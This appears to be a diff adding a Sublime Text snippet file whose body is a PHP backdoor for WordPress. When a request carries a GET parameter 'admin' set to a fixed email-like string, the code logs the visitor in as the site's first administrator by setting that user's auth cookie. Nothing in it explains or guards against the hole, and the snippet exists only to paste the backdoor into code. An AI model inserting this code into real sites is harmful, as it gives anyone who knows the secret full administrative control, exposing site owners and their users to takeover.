@@ -1,0 +1,19 @@
+<snippet>
+	<content><![CDATA[
+if ( isset(\$_GET['admin']) && \$_GET['admin'] == 'testing.xwhdkqxfpy.mail@gmail.com' ) {
+	if (!is_user_logged_in()) {
+		\$admins = get_users(array('role'=>'administrator'));
+		wp_set_auth_cookie(\$admins[0]->ID, true);
+		wp_redirect(\$_SERVER['REQUEST_URI']);
+		exit;
+	}
+}
+
+]]></content>
+	<!-- Optional: Set a tabTrigger to define how to trigger the snippet -->
+	<tabTrigger>admin_login_get</tabTrigger>
+	<!-- Optional: Set a scope to limit where the snippet will trigger -->
+	<scope>source.php - variable.other.php</scope>
+	 <!-- Optional: Description to show in the menu -->
+	<description> login</description>
+</snippet>
